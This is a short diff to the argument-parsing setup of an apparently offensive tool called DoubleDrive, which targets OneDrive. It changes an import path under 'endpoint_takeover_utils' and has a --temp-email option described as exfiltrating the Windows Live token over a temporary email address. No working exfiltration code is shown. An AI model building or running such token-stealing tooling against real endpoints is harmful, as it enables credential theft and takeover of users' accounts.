@@ -1,10 +1,10 @@
 import os
 import argparse
 import uuid
-from temp_email import TempEmail
+from doubledrive.endpoint_takeover_utils.temp_email import TempEmail
 
 def parse_args():
-    parser = argparse.ArgumentParser(description="Email setup for DoubleDrive")
+    parser = argparse.ArgumentParser(description="Options setup for OneDrive DoubleDrive")
 
     group = parser.add_mutually_exclusive_group(required=True)
     group.add_argument("--temp-email", help="If specified, sets DoubleDrive to exfiltrate the windows live token over a temp email", action="store_true")
